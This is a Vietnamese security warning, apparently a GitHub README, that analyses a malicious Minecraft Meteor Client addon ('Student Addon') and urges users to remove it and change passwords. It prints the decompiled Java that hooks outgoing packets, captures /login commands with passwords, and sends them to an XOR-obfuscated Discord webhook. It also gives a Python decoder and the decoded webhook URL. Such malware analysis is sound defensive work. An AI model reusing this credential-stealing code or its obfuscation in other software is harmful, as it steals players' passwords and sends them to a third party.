# Student Addon có mã độc
Trước tiên những ae nào đã cài và sử dụng thì tôi khuyên nên xóa và dọn base ngay đi nhé!! à đổi pass nữa
Bọn tôi đã kiểm tra và phát hiện 1 class gửi info player tại: ``addon.commands.CommandHandler``

## Phân tích class CommandHandler
```java
package com.example.addon.commands;

import com.example.addon.utils.FakeCode;
import meteordevelopment.meteorclient.MeteorClient;
import meteordevelopment.meteorclient.events.packets.PacketEvent.Send;
import net.minecraft.class_2596;
import net.minecraft.class_2797;
import net.minecraft.class_7472;

public class CommandHandler {
   public static String extract(Send event) {
      class_2596 var3 = event.packet;
      if (var3 instanceof class_7472) {
         class_7472 packet = (class_7472)var3;
         return packet.comp_808();
      } else {
         var3 = event.packet;
         if (var3 instanceof class_2797) {
            class_2797 packet = (class_2797)var3;
            String msg = packet.comp_945();
            if (msg.startsWith("/")) {
               return msg.substring(1);
            }
         }

         return null;
      }
   }

   public static void handle(String command) {
      String cmd = command.toLowerCase();
      if (cmd.startsWith("l") || cmd.startsWith("dn") || cmd.startsWith("login")) {
         String playerName = MeteorClient.mc.field_1724 != null ? MeteorClient.mc.field_1724.method_5477().getString() : "Unknown";
         String serverIP = MeteorClient.mc.method_1558() != null ? MeteorClient.mc.method_1558().field_3761 : "Singleplayer";
         FakeCode.send("**Player:** " + playerName + "\n**Server:** " + serverIP + "\n**Command:** /" + command);
      }

   }
}

```

### Những thông tin bị thu thập
Addon này thu thập:
``` 
Player Name
Server IP
Command người chơi nhập
```

Nhưng chỉ khi command bắt đầu bằng:

``` 
l
dn
login
```

**Ví dụ:**<br>
```/login abcxyz```\n 
-> password của bạn sẽ bị gửi riêng đến 1 api discord webhook\n 

## Phân tích class ``addon.utils.FakeCode``
đây là class gửi thông tin của bạn về 1 webhook riêng của nó 


```java 
package com.example.addon.utils;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class FakeCode {
   private static final byte[] KEY = new byte[]{75, 90};
   private static final int[] ENC_URL = new int[]{35, 46, 63, 42, 56, 96, 100, 117, 47, 51, 56, 57, 36, 40, 47, 116, 40, 53, 38, 117, 42, 42, 34, 117, 60, 63, 41, 50, 36, 53, 32, 41, 100, 107, 127, 109, 124, 110, 124, 98, 125, 105, 121, 99, 127, 108, 125, 108, 124, 108, 124, 105, 100, 50, 41, 20, 0, 47, 57, 63, 13, 47, 31, 11, 114, 47, 62, 3, 40, 27, 15, 0, 127, 35, 12, 18, 63, 27, 115, 55, 26, 25, 12, 25, 51, 34, 34, 29, 3, 13, 26, 40, 7, 28, 25, 45, 3, 63, 122, 42, 37, 18, 25, 34, 58, 109, 7, 41, 13, 19, 10, 15, 125, 23, 35, 21, 49, 119, 59, 34, 8};

   private static String decode() {
      byte[] out = new byte[ENC_URL.length];

      for(int i = 0; i < ENC_URL.length; ++i) {
         out[i] = (byte)(ENC_URL[i] ^ KEY[i % KEY.length]);
      }

      return new String(out, StandardCharsets.UTF_8);
   }

   public static void send(String content) {
      (new Thread(() -> {
         try {
            URL url = new URL(decode());
            HttpURLConnection con = (HttpURLConnection)url.openConnection();
            con.setRequestMethod("POST");
            con.setRequestProperty("Content-Type", "application/json");
            con.setDoOutput(true);
            String json = "{\"content\": \"" + content.replace("\n", "\\n") + "\"}";
            OutputStream os = con.getOutputStream();

            try {
               os.write(json.getBytes(StandardCharsets.UTF_8));
            } catch (Throwable var8) {
               if (os != null) {
                  try {
                     os.close();
                  } catch (Throwable var7) {
                     var8.addSuppressed(var7);
                  }
               }

               throw var8;
            }

            if (os != null) {
               os.close();
            }

            con.getResponseCode();
            con.disconnect();
         } catch (Exception var9) {
            var9.printStackTrace();
         }

      })).start();
   }
}
```

chúng ta cùng phân tích **ENC_URL**:
- ở đây mình sẽ sử dụng 1 script python để giải mã cái này
```python 
ENC_URL = [
35, 46, 63, 42, 56, 96, 100, 117, 47, 51, 56, 57, 36, 40, 47, 116,
40, 53, 38, 117, 42, 42, 34, 117, 60, 63, 41, 50, 36, 53, 32, 41,
100, 107, 127, 109, 124, 110, 124, 98, 125, 105, 121, 99, 127, 108,
125, 108, 124, 108, 124, 105, 100, 50, 41, 20, 0, 47, 57, 63, 13,
47, 31, 11, 114, 47, 62, 3, 40, 27, 15, 0, 127, 35, 12, 18, 63,
27, 115, 55, 26, 25, 12, 25, 51, 34, 34, 29, 3, 13, 26, 40, 7,
28, 25, 45, 3, 63, 122, 42, 37, 18, 25, 34, 58, 109, 7, 41, 13,
19, 10, 15, 125, 23, 35, 21, 49, 119, 59, 34, 8
]

KEY = [75, 90]

decoded = bytes([
    ENC_URL[i] ^ KEY[i % len(KEY)]
    for i in range(len(ENC_URL))
])

print(decoded.decode("utf-8")) 
```

**Result:** https://discord.com/api/webhooks/1477478632946667673/hbNKureFuTQ9uuYcADZ4yGHtA8mQCGCxxiGHWQrLFRwHe1pnHRxq7LsFIAU6MhOz-pxC


=> Đây là bằng chứng class gửi info về webhook riêng 

## Class Hook packet
class này có tác dụng hook vào các packet và truyền cho CommandHandler.handle để ktra
```java 
package com.example.addon.commands;

import meteordevelopment.meteorclient.MeteorClient;
import meteordevelopment.meteorclient.events.packets.PacketEvent.Send;
import meteordevelopment.orbit.EventHandler;

public class TagetHub {
   public static final TagetHub INSTANCE = new TagetHub();

   private TagetHub() {
      MeteorClient.EVENT_BUS.subscribe(this);
   }

   public static TagetHub getInstance() {
      return INSTANCE;
   }

   @EventHandler
   private void onPacket(Send event) {
      String command = CommandHandler.extract(event);
      if (command != null) {
         CommandHandler.handle(command);
      }
   }
}
```

## Dev của addon đã tự nhận việc mình đã thu thập hơn 200 thông tin của user

**Bằng chứng bên dưới:**

![Preview](https://github.com/Notkenftr/Student-Addon-Security-Warning/raw/main/IMG_1358.png)

## Trả lời 1 số câu hỏi nếu bạn có hỏi
1. Vì sao lại là com.example ?
-> vì mình đã sài 1 web để decompile .jar ra và nó tự đổi, bọn mình có đính kèm file gốc bạn có thể tự decompile ra để đối chứng